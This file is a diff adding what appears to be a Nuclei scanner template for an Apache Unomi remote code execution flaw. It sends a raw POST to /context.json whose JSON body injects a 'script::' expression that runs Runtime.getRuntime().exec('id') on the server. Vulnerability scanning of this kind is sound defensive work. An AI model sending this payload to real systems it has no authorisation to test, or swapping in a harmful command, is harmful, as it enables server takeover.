@@ -1,0 +1,28 @@
+id: UNOMI-RCE
+
+info: 
+  name: Appache Unomi RCE
+  author: abdulrahman
+  severity: critical
+
+requests:
+  - raw:
+    - |
+      POST /context.json HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Faster You fool
+      Content-type: application/json
+
+      {"filters":[{"id":"boom ","filters":[{"condition":{"parameterValues":{"propertyName":"prop","comparisonOperator":"equals","propertyValue":"script::Runtime r=Runtime.getRuntime();r.exec('id');"},"type":"profilePropertyCondition"}}]}],"sessionId":"boom"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "boom"
+
+      - type: status
+        status:
+          - 200
+
